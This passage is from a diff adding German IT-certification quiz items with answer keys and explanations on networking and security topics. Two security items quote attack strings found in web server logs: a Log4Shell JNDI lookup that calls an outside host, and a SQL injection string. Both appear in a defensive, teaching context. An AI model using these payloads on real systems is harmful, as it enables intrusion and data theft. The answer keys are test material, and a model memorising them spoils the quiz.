@@ -18526,5 +18526,2429 @@
     ],
     "a": "ca. 7,28 Stunden",
     "exp": "Erlaubter Ausfall: 8.760 h * 0,3 % = 26,28 Stunden. Davon sind 19 verbraucht: 26,28 - 19 = 7,28 Stunden."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Am WAN-Interface eines Routers filtert eine einfache, zustandslose ACL eingehend und erlaubt nur TCP 443 zum Webserver. Seitdem laden Webseiten auf den Büro-PCs nicht mehr. Warum?",
+    "options": [
+      "Die ACL kennt keine Verbindungen und verwirft die Antwortpakete",
+      "Die ACL blockiert auch den ausgehenden Verkehr der PCs",
+      "Die ACL überschreibt die Standardroute des Routers",
+      "Die ACL sperrt die DHCP-Vergabe im Büronetz"
+    ],
+    "a": "Die ACL kennt keine Verbindungen und verwirft die Antwortpakete",
+    "exp": "Eine zustandslose ACL prüft jedes Paket einzeln. Antworten aus dem Internet sind eingehende Pakete und treffen das implizite deny, hier helfen eine Regel mit established oder eine zustandsbehaftete Firewall."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Nur das Admin-Netz 10.0.99.0/24 soll sich per SSH auf einen Cisco-Switch verbinden dürfen. Wie setzen Sie das um?",
+    "options": [
+      "Eine Standard-ACL per access-class auf den VTY-Leitungen",
+      "Eine ACL per ip access-group auf allen Access-Ports",
+      "Eine Portweiterleitung von TCP 22 auf den Switch",
+      "Ein eigenes Native VLAN nur für SSH-Verbindungen"
+    ],
+    "a": "Eine Standard-ACL per access-class auf den VTY-Leitungen",
+    "exp": "access-class bindet eine ACL an die virtuellen Terminalleitungen und begrenzt so, von wo Fernzugriffe angenommen werden. Andere Netze erhalten keinen Login-Prompt."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "In show ip route steht: O 10.50.0.0/24 [110/20] via 10.0.0.2. Was bedeuten die Werte in der eckigen Klammer?",
+    "options": [
+      "Administrative Distanz 110 und OSPF-Kosten 20",
+      "Hop-Anzahl 110 und Verzögerung von 20 ms",
+      "VLAN-Nummer 110 und Switchport-Nummer 20",
+      "Priorität 110 und Bandbreite von 20 Mbit/s"
+    ],
+    "a": "Administrative Distanz 110 und OSPF-Kosten 20",
+    "exp": "Der erste Wert ist die administrative Distanz der Routenquelle, bei OSPF 110. Der zweite ist die Metrik, bei OSPF die aufsummierten Kosten bis zum Ziel."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein Kollege sucht in show vlan brief den Uplink-Port Gi0/48 zum Core und findet ihn in keinem VLAN. Was ist die wahrscheinlichste Erklärung?",
+    "options": [
+      "Gi0/48 ist ein Trunk, Trunks erscheinen dort nicht",
+      "Gi0/48 ist defekt und wurde aus der Liste entfernt",
+      "Gi0/48 gehört automatisch zum Native VLAN 4095",
+      "Gi0/48 wird erst nach dem Speichern angezeigt"
+    ],
+    "a": "Gi0/48 ist ein Trunk, Trunks erscheinen dort nicht",
+    "exp": "show vlan brief listet nur Access-Ports. Welche VLANs ein Trunk überträgt, zeigt show interfaces trunk."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Auf einem Linux-Server zeigt ip neigh für das Gateway 10.0.8.1 den Zustand FAILED. Was folgt daraus?",
+    "options": [
+      "Das Gateway antwortet nicht auf ARP-Anfragen",
+      "Der DNS-Server kann den Gatewaynamen nicht auflösen",
+      "In der Routingtabelle fehlt die Standardroute",
+      "Die Firewall blockiert ICMP-Echo zum Gateway"
+    ],
+    "a": "Das Gateway antwortet nicht auf ARP-Anfragen",
+    "exp": "FAILED bedeutet, dass die ARP-Anfragen unbeantwortet blieben. Typische Ursachen sind ein falsches VLAN, ein fehlender Link oder ein ausgefallenes Gateway, ICMP-Filter spielen für ARP keine Rolle."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "ip -6 addr zeigt bei einer statisch gesetzten IPv6-Adresse den Zusatz \"dadfailed tentative\". Was bedeutet das?",
+    "options": [
+      "Ein anderes Gerät nutzt die Adresse bereits",
+      "Die Adresse wartet noch auf eine DHCPv6-Bestätigung",
+      "Das Präfix ist länger als /64 und daher ungültig",
+      "Die Adresse gilt nur link-lokal und nicht global"
+    ],
+    "a": "Ein anderes Gerät nutzt die Adresse bereits",
+    "exp": "Vor der Nutzung prüft ein Host per Duplicate Address Detection, ob die Adresse frei ist. Antwortet ein anderes Gerät, bleibt sie im Zustand tentative und wird nicht verwendet."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "tracert von einem Büro-PC zeigt: Hop 1 192.168.178.1, Hop 2 192.168.0.1, Hop 3 ein Router des Providers. Welches Problem ist bei diesem Aufbau typisch?",
+    "options": [
+      "Doppeltes NAT stört Portweiterleitungen und VPN",
+      "Die DNS-Auflösung dauert doppelt so lange wie üblich",
+      "Der zweite Router halbiert die verfügbare Bandbreite",
+      "Die PCs erhalten keine IPv4-Adresse mehr per DHCP"
+    ],
+    "a": "Doppeltes NAT stört Portweiterleitungen und VPN",
+    "exp": "Zwei private Netze hintereinander zeigen zwei NAT-Router. Eingehende Verbindungen müssen dann auf beiden Geräten weitergeleitet werden. Abhilfe schaffen Bridge- bzw. Modembetrieb oder ein Exposed Host."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Das Protokoll des DHCP-Servers zeigt Anfragen aus VLAN 70 mit der Relay-Adresse 10.70.0.1, es werden aber keine Angebote verschickt. Andere VLANs funktionieren. Was fehlt?",
+    "options": [
+      "Ein Adressbereich für das Netz 10.70.0.0/24",
+      "Der Helper-Eintrag auf der SVI von VLAN 70",
+      "Die Option 82 im Bereich des Standard-VLANs",
+      "Eine Freigabe für UDP 68 auf dem DHCP-Server"
+    ],
+    "a": "Ein Adressbereich für das Netz 10.70.0.0/24",
+    "exp": "Die Anfragen erreichen den Server, das Relay arbeitet also. Der Server wählt den Bereich anhand der Relay-Adresse und schweigt, wenn kein passender Bereich existiert."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein Admin will VLAN 30 zu einem Trunk hinzufügen und tippt switchport trunk allowed vlan 30. Kurz darauf fallen alle anderen VLANs auf diesem Uplink aus. Warum?",
+    "options": [
+      "Der Befehl ersetzt die Liste, richtig wäre allowed vlan add 30",
+      "Ein Trunk darf nur ein VLAN tragen, weitere brauchen einen zweiten Trunk",
+      "VLAN 30 hat dadurch die Rolle des Native VLAN übernommen",
+      "Der Switch startet nach Trunk-Änderungen alle Ports neu"
+    ],
+    "a": "Der Befehl ersetzt die Liste, richtig wäre allowed vlan add 30",
+    "exp": "Ohne add überschreibt der Befehl die erlaubten VLANs vollständig. Auf dem Trunk läuft danach nur noch VLAN 30, ein häufiger und folgenreicher Tippfehler."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein IP-Telefon mit durchgeschleiftem PC hängt an einem Port mit switchport access vlan 10 und switchport voice vlan 50. In welchem VLAN arbeitet der PC?",
+    "options": [
+      "In VLAN 10 ohne Tag, das Telefon sendet getaggt in VLAN 50",
+      "In VLAN 50, weil sein Verkehr über das Telefon läuft",
+      "Abwechselnd in beiden VLANs je nach Auslastung",
+      "In keinem, ein PC braucht einen eigenen Switchport"
+    ],
+    "a": "In VLAN 10 ohne Tag, das Telefon sendet getaggt in VLAN 50",
+    "exp": "Das Telefon lernt das Voice-VLAN per CDP oder LLDP und taggt seine Sprachpakete. Frames des PCs reicht es ungetaggt weiter, sie landen im Access-VLAN."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Nach einem VRRP-Wechsel erreichen die Clients das Gateway sofort weiter, obwohl ihr ARP-Cache nicht geleert wurde. Warum?",
+    "options": [
+      "Der neue Master übernimmt die virtuelle MAC-Adresse",
+      "Die Clients fragen vor jedem Paket neu per ARP nach",
+      "Der alte Master leitet alle Pakete an den neuen weiter",
+      "Der DHCP-Server teilt den Clients das neue Gateway mit"
+    ],
+    "a": "Der neue Master übernimmt die virtuelle MAC-Adresse",
+    "exp": "VRRP nutzt eine virtuelle MAC-Adresse der Form 00-00-5E-00-01-xx. Der neue Master verwendet sie weiter und meldet das per Gratuitous ARP an die Switches."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein Admin muss für Sicherheitsvorfälle nachweisen können, welches Gerät wann welche IPv6-Adresse hatte. Welche Adressvergabe erleichtert das am meisten?",
+    "options": [
+      "Stateful DHCPv6 mit protokollierten Vergaben",
+      "SLAAC mit aktivierten Privacy Extensions",
+      "SLAAC mit DNS-Server-Angabe per RDNSS",
+      "Nur link-lokale Adressen nach EUI-64"
+    ],
+    "a": "Stateful DHCPv6 mit protokollierten Vergaben",
+    "exp": "Bei SLAAC bilden die Clients ihre Adressen selbst, mit Privacy Extensions wechseln sie zusätzlich regelmäßig. Ein DHCPv6-Server führt dagegen ein Protokoll über jede Zuweisung."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Im IPv6-Konzept wird das Transfernetz zwischen Firewall und Core-Router geplant. Welche Präfixlänge wird für solche Punkt-zu-Punkt-Verbindungen nach RFC 6164 konfiguriert?",
+    "options": [
+      "/127, oft mit einem dafür reservierten /64",
+      "/48, damit später weitere Router passen",
+      "/96, weil Router keine SLAAC-Adressen nutzen",
+      "/128, da nur ein Router adressiert wird"
+    ],
+    "a": "/127, oft mit einem dafür reservierten /64",
+    "exp": "RFC 6164 empfiehlt /127 für Router-Verbindungen, das beugt u.a. Angriffen auf den Neighbor Cache vor. Viele Konzepte reservieren trotzdem ein /64 je Verbindung, um einheitlich zu bleiben."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "In einem Gäste-WLAN mit 800 Geräten hinter einer öffentlichen IPv4-Adresse scheitern zur Stoßzeit neue Verbindungen, die Leitung ist nicht ausgelastet. Die Firewall meldet eine volle NAT-Tabelle. Was hilft?",
+    "options": [
+      "PAT über mehrere öffentliche Adressen verteilen",
+      "Die DHCP-Leasedauer im Gäste-WLAN verlängern",
+      "Die WLAN-Kanalbreite auf 80 MHz erhöhen",
+      "Den DNS-Cache der Firewall deutlich vergrößern"
+    ],
+    "a": "PAT über mehrere öffentliche Adressen verteilen",
+    "exp": "PAT unterscheidet Verbindungen über Quellports, je öffentlicher Adresse stehen nur rund 64.000 zur Verfügung. Mehr Adressen im Pool oder kürzere Timeouts für inaktive Einträge schaffen Platz."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Zwischen Zentrale und Filiale soll ein IPsec-VPN laufen, über das OSPF die Routen austauscht. Welche Tunnelart eignet sich?",
+    "options": [
+      "Routenbasiert mit eigener Tunnelschnittstelle (VTI)",
+      "Richtlinienbasiert mit fest eingetragenen Netzlisten",
+      "IPsec im Transportmodus ohne eigene Schnittstelle",
+      "SSL-VPN im Browsermodus mit einem Webportal"
+    ],
+    "a": "Routenbasiert mit eigener Tunnelschnittstelle (VTI)",
+    "exp": "Ein routenbasierter Tunnel erscheint als eigene Schnittstelle, über die Routingprotokolle Nachbarschaften bilden. Richtlinienbasierte Tunnel verschlüsseln nur fest definierte Netzpaare und transportieren keine OSPF-Multicasts."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Eine Filiale hat eine wechselnde öffentliche IPv4-Adresse, die Zentrale eine feste. Wie wird der Site-to-Site-Tunnel zuverlässig aufgebaut?",
+    "options": [
+      "Die Filiale baut den Tunnel zur Zentrale auf",
+      "Die Zentrale sucht die Filiale per Broadcast im Internet",
+      "Beide Seiten nutzen IPsec im Transportmodus",
+      "Die Filiale nutzt eine Adresse aus 100.64.0.0/10"
+    ],
+    "a": "Die Filiale baut den Tunnel zur Zentrale auf",
+    "exp": "Die Zentrale kennt die aktuelle Filialadresse nicht, die Filiale dagegen das feste Ziel. Die Zentrale nimmt daher Verbindungen von beliebiger Adresse an und prüft die Identität per Zertifikat oder Kennung."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Das Zertifikat des RADIUS-Servers wurde erneuert und stammt jetzt von einer neuen internen CA. Seitdem verbinden sich WLAN-Clients nicht mehr mit WPA2-Enterprise. Was ist die wahrscheinlichste Ursache?",
+    "options": [
+      "Die Clients vertrauen der neuen ausstellenden CA noch nicht",
+      "Die WLAN-Kanäle müssen nach dem Tausch neu vergeben werden",
+      "Der Pre-Shared Key ist mit dem alten Zertifikat abgelaufen",
+      "Die Clients brauchen zuerst ein neues DHCP-Lease"
+    ],
+    "a": "Die Clients vertrauen der neuen ausstellenden CA noch nicht",
+    "exp": "Die WLAN-Profile prüfen das Serverzertifikat gegen festgelegte Stammzertifikate. Die neue CA muss vorab per Gruppenrichtlinie oder MDM verteilt und im Profil eingetragen werden."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "An einem 802.1X-Port hängt ein IP-Telefon mit PC dahinter. Das Telefon wird angemeldet, der PC bleibt ohne Zugang. Der Port steht im Single-Host-Modus. Was ändern Sie?",
+    "options": [
+      "Den Multi-Domain-Modus, der Telefon und PC getrennt anmeldet",
+      "PortFast am Port aktivieren, damit beide sofort starten",
+      "Das Telefon ins Native VLAN des Uplinks verschieben",
+      "Den RADIUS-Timeout auf 60 Sekunden erhöhen"
+    ],
+    "a": "Den Multi-Domain-Modus, der Telefon und PC getrennt anmeldet",
+    "exp": "Im Single-Host-Modus darf nur ein Gerät am Port authentifiziert sein. Multi-Domain erlaubt je ein Gerät in der Sprach- und in der Datendomäne mit eigener Anmeldung."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Die IP-Telefone markieren Sprache mit DSCP EF. Ein Mitschnitt hinter dem Access-Switch zeigt bei allen Sprachpaketen DSCP 0. Was ist die wahrscheinliche Ursache?",
+    "options": [
+      "Der Port vertraut den Markierungen nicht",
+      "EF wird nur in IPv6-Paketen übertragen",
+      "Die Telefone nutzen einen ungeeigneten Codec",
+      "Der Mitschnitt zeigt DSCP immer als 0 an"
+    ],
+    "a": "Der Port vertraut den Markierungen nicht",
+    "exp": "Ist QoS aktiv, aber der Port nicht als vertrauenswürdig konfiguriert, überschreibt der Switch eingehende Markierungen. Für Telefonports stellt man Trust ein, oft nur bei erkanntem Telefon."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Für eine Standortkopplung mit VoIP soll die Einweg-Verzögerung bewertet werden. Bis zu welchem Wert gilt sie nach ITU-T G.114 für die meisten Gespräche als unkritisch?",
+    "options": [
+      "Bis etwa 150 ms",
+      "Bis etwa 15 ms",
+      "Bis etwa 500 ms",
+      "Bis etwa 1.500 ms"
+    ],
+    "a": "Bis etwa 150 ms",
+    "exp": "Bis rund 150 ms Einweg-Verzögerung nehmen Gesprächspartner kaum Einschränkungen wahr. Darüber leidet die Gesprächsqualität, ab etwa 400 ms gilt sie als nicht mehr akzeptabel."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Messungen zeigen bei VoIP stark schwankende Paketlaufzeiten, aber kaum Paketverluste. Welche Einrichtung im Telefon gleicht das aus?",
+    "options": [
+      "Ein Jitter-Puffer",
+      "Eine Echounterdrückung",
+      "Ein größeres TCP-Fenster",
+      "Eine Rufnummernsperre"
+    ],
+    "a": "Ein Jitter-Puffer",
+    "exp": "Der Jitter-Puffer sammelt Sprachpakete kurz und gibt sie gleichmäßig wieder. Er erhöht dabei die Verzögerung etwas, sehr großer Jitter führt trotzdem zu Aussetzern."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Die Filialen einer Handelskette leiten allen Internetverkehr über MPLS durch die Zentrale. Microsoft-365-Anwendungen reagieren in den Filialen träge. Welche SD-WAN-Funktion hilft?",
+    "options": [
+      "Lokaler Internet-Breakout für freigegebene Cloud-Dienste",
+      "Mehr Bandbreite nur für die MPLS-Leitung der Filialen",
+      "Zentrales NAT aller Filialen über eine gemeinsame IP",
+      "Ein zusätzlicher Proxy in der Zentrale für jeden Dienst"
+    ],
+    "a": "Lokaler Internet-Breakout für freigegebene Cloud-Dienste",
+    "exp": "Beim lokalen Breakout gehen vertrauenswürdige Cloud-Dienste direkt aus der Filiale ins Internet. Der Umweg über die Zentrale entfällt, Laufzeit und Last am zentralen Anschluss sinken."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Ein Kunde vergleicht ein MPLS-VPN seines Providers mit IPsec-Tunneln über normale Internetanschlüsse. Was ist ein typischer Vorteil von MPLS?",
+    "options": [
+      "Vom Provider per SLA zugesicherte Bandbreite und Laufzeit",
+      "Automatische Ende-zu-Ende-Verschlüsselung aller Daten",
+      "Deutlich niedrigere Kosten als ein Internetanschluss",
+      "Keine Abhängigkeit von einem einzelnen Provider"
+    ],
+    "a": "Vom Provider per SLA zugesicherte Bandbreite und Laufzeit",
+    "exp": "MPLS läuft im Netz eines Providers mit garantierten Eigenschaften. Die Daten sind dabei logisch getrennt, aber nicht automatisch verschlüsselt."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Eine Firma verbindet jede ihrer 15 Filialen per VPN nur mit der Zentrale. Was bedeutet das für Verkehr zwischen zwei Filialen?",
+    "options": [
+      "Er läuft über die Zentrale und belastet deren Leitung doppelt",
+      "Er wird gar nicht übertragen, Filialen bleiben isoliert",
+      "Er nutzt automatisch einen direkten Tunnel",
+      "Er läuft unverschlüsselt über das Internet"
+    ],
+    "a": "Er läuft über die Zentrale und belastet deren Leitung doppelt",
+    "exp": "In einer Hub-and-Spoke-Topologie gibt es nur Tunnel zur Zentrale. Pakete von Filiale zu Filiale kommen dort an und gehen wieder hinaus, was Laufzeit und Bandbreite kostet."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Eine Filiale hat Glasfaser und LTE. Das SD-WAN soll Telefonate auf die bessere Leitung legen, sobald die Glasfaser Paketverluste zeigt. Wie arbeitet es?",
+    "options": [
+      "Es misst die Leitungsqualität laufend und lenkt um",
+      "Es wechselt erst, wenn die Glasfaser vollständig ausfällt",
+      "Es verteilt alle Pakete zufällig auf beide Leitungen",
+      "Es nutzt immer die Leitung mit der kleineren Adresse"
+    ],
+    "a": "Es misst die Leitungsqualität laufend und lenkt um",
+    "exp": "SD-WAN überwacht die Qualität jeder Leitung laufend mit Messpaketen. Je Anwendung legt eine Richtlinie Grenzwerte fest, bei deren Überschreiten der Verkehr umgelenkt wird."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Nach einer Störung zeigt sich, dass die Switchkonfigurationen seit Monaten nicht gesichert wurden und niemand weiß, was zuletzt geändert wurde. Was führen Sie ein?",
+    "options": [
+      "Eine automatische, versionierte Konfigurationssicherung",
+      "Einen wöchentlichen Neustart aller Switches im Netz",
+      "Einen Screenshot der Weboberfläche je Quartal",
+      "Eine Sicherung nur vor geplanten Firmwareupdates"
+    ],
+    "a": "Eine automatische, versionierte Konfigurationssicherung",
+    "exp": "Werkzeuge wie Oxidized oder RANCID holen die Konfigurationen regelmäßig ab und speichern jede Änderung als Version. So lassen sich Unterschiede vergleichen und ein funktionierender Stand wiederherstellen."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Für neue IP-Kameras wurde VLAN 60 mit eigenem Subnetz eingerichtet und auf mehreren Switches gepatcht. Welche Unterlagen aktualisieren Sie?",
+    "options": [
+      "VLAN- und IP-Adressplan, Portbelegung und logischen Netzplan",
+      "Nur die Inventarliste mit den Seriennummern der Kameras",
+      "Nur das Kennwort der Kameras im Passwortsafe",
+      "Nur die Rechnung und den Lieferschein der Kameras"
+    ],
+    "a": "VLAN- und IP-Adressplan, Portbelegung und logischen Netzplan",
+    "exp": "Eine Netzänderung betrifft mehrere Dokumente zugleich. Nur wenn Adressplan, Portbelegung und Netzplan zusammenpassen, findet ein Kollege bei einer Störung schnell den richtigen Port."
+  },
+  {
+    "cat": "netzwerk",
+    "q": "Bei der Analyse einer Störung lassen sich die Syslog-Meldungen von Firewall und Switches nicht in eine Reihenfolge bringen, die Uhrzeiten weichen um Minuten ab. Was fehlt?",
+    "options": [
+      "Eine gemeinsame Zeitquelle per NTP auf allen Geräten",
+      "Ein größerer Speicher für Syslog auf den Switches",
+      "Eine eigene Zeitzone für jedes Netzwerkgerät",
+      "Ein höherer Loglevel für alle Meldungen"
+    ],
+    "a": "Eine gemeinsame Zeitquelle per NTP auf allen Geräten",
+    "exp": "Nur mit synchronen Uhren lassen sich Ereignisse mehrerer Geräte zeitlich zuordnen. Man trägt auf allen Geräten dieselben NTP-Server ein und prüft die Synchronisation regelmäßig."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Die interne Firewall zwischen Client- und Server-VLAN verwirft gesperrte Pakete kommentarlos (Drop). Anwendungen hängen dadurch lange im Timeout. Was ist intern oft sinnvoller?",
+    "options": [
+      "Reject, weil der Client sofort eine Ablehnung erhält",
+      "Allow, weil intern gar keine Firewall nötig ist",
+      "Drop mit deutlich längerem Timeout auf allen Clients",
+      "Reject nur für UDP und Allow für jeden TCP-Verkehr"
+    ],
+    "a": "Reject, weil der Client sofort eine Ablehnung erhält",
+    "exp": "Bei Drop wartet der Absender, bis sein Timeout abläuft. Reject sendet einen TCP-Reset oder eine ICMP-Meldung, der Fehler zeigt sich sofort. Zum Internet hin nutzt man eher Drop, um Scannern möglichst wenig zu verraten."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Auf einer zustandsorientierten Firewall findet sich die Regel \"allow tcp any Quellport 80 -> LAN any\" mit dem Kommentar \"Antworten der Webserver\". Wie bewerten Sie sie?",
+    "options": [
+      "Überflüssig und gefährlich, Antworten sind schon erlaubt",
+      "Notwendig, sonst kommen keine Webseiten im LAN an",
+      "Richtig, aber sie gehört an das Ende des Regelwerks",
+      "Unkritisch, weil Port 80 nur für HTTP genutzt wird"
+    ],
+    "a": "Überflüssig und gefährlich, Antworten sind schon erlaubt",
+    "exp": "Eine Stateful Firewall erlaubt Antwortpakete zu erlaubten Verbindungen automatisch. Die Regel öffnet dagegen jedem Angreifer mit Quellport 80 alle Ports im LAN. Sie wird ersatzlos gelöscht."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Am Ende des Regelwerks steht eine explizite Regel \"deny any any\" mit eingeschaltetem Logging, obwohl die Firewall ohnehin alles Nichterlaubte sperrt. Wozu?",
+    "options": [
+      "Damit abgelehnter Verkehr protokolliert und auswertbar wird",
+      "Damit die Firewall die Regeln schneller abarbeitet",
+      "Damit erlaubte Verbindungen doppelt geprüft werden",
+      "Damit die Regel alle Freigaben darüber aufhebt"
+    ],
+    "a": "Damit abgelehnter Verkehr protokolliert und auswertbar wird",
+    "exp": "Die implizite Sperre am Ende protokolliert je nach Hersteller nichts. Mit einer sichtbaren Aufräumregel und Logging erkennt man Scans, Fehlkonfigurationen und fehlende Freigaben. Die Logs gehen idealerweise an das SIEM."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein Schwachstellenscan findet auf einem Windows-Dateiserver aktiviertes SMBv1. Alle Clients laufen mit Windows 11. Was tun Sie?",
+    "options": [
+      "SMBv1 deaktivieren, weil es veraltet ist und bekannte Lücken hat",
+      "SMBv1 aktiv lassen, weil Windows 11 es zwingend braucht",
+      "Nur SMBv3 abschalten, damit die Clients auf SMBv1 wechseln",
+      "SMBv1 behalten und nur die Freigaben schreibgeschützt setzen"
+    ],
+    "a": "SMBv1 deaktivieren, weil es veraltet ist und bekannte Lücken hat",
+    "exp": "SMBv1 wurde unter anderem durch WannaCry über die Lücke EternalBlue bekannt. Aktuelle Clients sprechen SMBv2 und SMBv3. Vor dem Abschalten prüft man per Überwachung, ob ein Altgerät wie ein Scanner noch SMBv1 nutzt."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Für einen neuen Windows-Server mit den Rollen DNS und DHCP soll die Angriffsfläche möglichst klein sein. Welche Installationsart wählen Sie?",
+    "options": [
+      "Server Core ohne grafische Oberfläche, verwaltet per Remote-Werkzeugen",
+      "Desktopdarstellung, weil sie leichter zu bedienen ist",
+      "Eine Client-Version von Windows mit nachinstallierten Rollen",
+      "Die grafische Installation mit zusätzlichem Webbrowser"
+    ],
+    "a": "Server Core ohne grafische Oberfläche, verwaltet per Remote-Werkzeugen",
+    "exp": "Server Core enthält weniger Komponenten, braucht weniger Updates und bietet weniger Angriffsfläche. Verwaltet wird er mit RSAT, Windows Admin Center oder PowerShell. Für DNS und DHCP reicht das völlig aus."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Auf einem Notebook zeigen alle HTTPS-Seiten die Warnung \"Zertifikat noch nicht gültig\". Andere Geräte haben kein Problem. Was prüfen Sie zuerst?",
+    "options": [
+      "Datum und Uhrzeit des Notebooks",
+      "Die Grafiktreiber des Notebooks",
+      "Die Größe des Browser-Caches",
+      "Die DNS-Einträge des Webservers"
+    ],
+    "a": "Datum und Uhrzeit des Notebooks",
+    "exp": "Der Browser vergleicht die Gültigkeitsdaten des Zertifikats mit der eigenen Systemzeit. Steht die Uhr zum Beispiel nach einem BIOS-Batteriewechsel auf einem alten Datum, wirken alle Zertifikate ungültig. Ein Abgleich per NTP behebt das."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Die Root-CA der internen PKI läuft in zwei Monaten ab. Was passiert mit den davon abgeleiteten Zertifikaten, wenn niemand handelt?",
+    "options": [
+      "Ihre Kette wird mit dem Ablauf der Root ungültig",
+      "Sie gelten bis zu ihrem eigenen Ablaufdatum unverändert weiter",
+      "Sie werden automatisch von einer öffentlichen CA übernommen",
+      "Sie werden beim Ablauf der Root automatisch um ein Jahr verlängert"
+    ],
+    "a": "Ihre Kette wird mit dem Ablauf der Root ungültig",
+    "exp": "Ein Zertifikat ist nur gültig, wenn jedes Glied der Kette gültig ist. Die Root-CA wird deshalb rechtzeitig erneuert und das neue Root-Zertifikat an alle Clients verteilt. Ihre Laufzeit plant man deutlich länger als die der ausgestellten Zertifikate."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Ein Notebook, das per 802.1X mit EAP-TLS und Gerätezertifikat ins WLAN kommt, wurde gestohlen. Was tun Sie?",
+    "options": [
+      "Gerätezertifikat sperren und Computerkonto im AD deaktivieren",
+      "Das WLAN-Kennwort für alle Mitarbeiter sofort ändern",
+      "Nichts, weil EAP-TLS gar kein Kennwort verwendet",
+      "Nur die MAC-Adresse des Notebooks im Switch eintragen"
+    ],
+    "a": "Gerätezertifikat sperren und Computerkonto im AD deaktivieren",
+    "exp": "Bei EAP-TLS weist das Zertifikat das Gerät aus, ein gemeinsames Kennwort gibt es nicht. Die Sperrung verhindert neue Anmeldungen, sobald die aktuelle Sperrliste gilt. Das deaktivierte Computerkonto sperrt zusätzlich, wenn der RADIUS-Server das Konto prüft."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Der Schwachstellenscanner arbeitet bisher ohne Anmeldedaten und findet auf den Clients kaum etwas. Was verbessert die Aussagekraft?",
+    "options": [
+      "Ein authentifizierter Scan mit eigenem Scan-Konto",
+      "Ein Scan nur noch nachts mit doppelter Geschwindigkeit",
+      "Ein Scan nur der offenen Ports aus dem Internet",
+      "Ein Scan mit dem Konto eines beliebigen Mitarbeiters"
+    ],
+    "a": "Ein authentifizierter Scan mit eigenem Scan-Konto",
+    "exp": "Ohne Anmeldung sieht der Scanner nur, was über das Netz antwortet. Mit Anmeldung liest er installierte Software, Patchstände und Konfigurationen aus. Das Scan-Konto wird eigens angelegt, geschützt und überwacht."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Microsoft veröffentlicht am Patchday ein kritisches Update. Wie rollen Sie es auf 800 Clients aus?",
+    "options": [
+      "Erst in einer Pilotgruppe testen, dann in Ringen verteilen",
+      "Sofort auf alle 800 Clients gleichzeitig ohne Test",
+      "Erst nach sechs Monaten, wenn sich Fehler gezeigt haben",
+      "Nur auf den Clients, deren Nutzer es selbst anfordern"
+    ],
+    "a": "Erst in einer Pilotgruppe testen, dann in Ringen verteilen",
+    "exp": "Ein Pilotring aus IT und ausgewählten Nutzern zeigt Probleme früh, ohne alle zu treffen. Danach folgen die weiteren Ringe mit festen Fristen. Bei aktiv ausgenutzten Lücken werden die Abstände deutlich verkürzt."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Im Sicherheitsprotokoll eines Servers ist das Ereignis 1102 der älteste Eintrag, ältere Ereignisse fehlen ganz. Was bedeutet das?",
+    "options": [
+      "Das Überwachungsprotokoll wurde gezielt gelöscht",
+      "Das Protokoll wurde regulär wegen Größe archiviert",
+      "Ein Benutzer hat sich erfolgreich angemeldet",
+      "Die Ereignisanzeige wurde auf Englisch umgestellt"
+    ],
+    "a": "Das Überwachungsprotokoll wurde gezielt gelöscht",
+    "exp": "Angreifer löschen Protokolle, um ihre Spuren zu verwischen. Deshalb werden Logs zeitnah an einen zentralen Log-Server oder das SIEM weitergeleitet. Dort bleiben die älteren Einträge erhalten und das Ereignis 1102 löst einen Alarm aus."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Im Access-Log des Webservers steht ein Zugriff mit dem User-Agent \"${jndi:ldap://198.51.100.7/a}\". Worauf deutet das?",
+    "options": [
+      "Einen Versuch, die Log4Shell-Lücke in Java-Anwendungen auszunutzen",
+      "Einen normalen Aufruf durch ein veraltetes Browsermodell",
+      "Eine Anfrage des Suchmaschinen-Crawlers eines Anbieters",
+      "Eine fehlerhafte LDAP-Anmeldung eines internen Nutzers"
+    ],
+    "a": "Einen Versuch, die Log4Shell-Lücke in Java-Anwendungen auszunutzen",
+    "exp": "Der Ausdruck lässt verwundbare Log4j-Versionen beim Protokollieren eine Verbindung zum angegebenen Server aufbauen und Code nachladen. Man prüft, ob Java-Anwendungen mit Log4j im Einsatz und gepatcht sind. Ausgehende Verbindungen zu der Adresse im Firewall-Log sind ein Hinweis auf Erfolg."
+  },
+  {
+    "cat": "sicherheit",
+    "q": "Im Access-Log steht \"GET /artikel.php?id=5'+OR+'1'='1 HTTP/1.1\" 200 mit einer Antwort von 480 KB statt sonst 12 KB. Wie deuten Sie das?",
+    "options": [
+      "Eine SQL-Injection, die vermutlich Daten ausgelesen hat",
+      "Ein harmloser Seitenaufruf mit Sonderzeichen in der URL",
+      "Ein Cross-Site-Scripting-Angriff auf die Browser der Besucher",
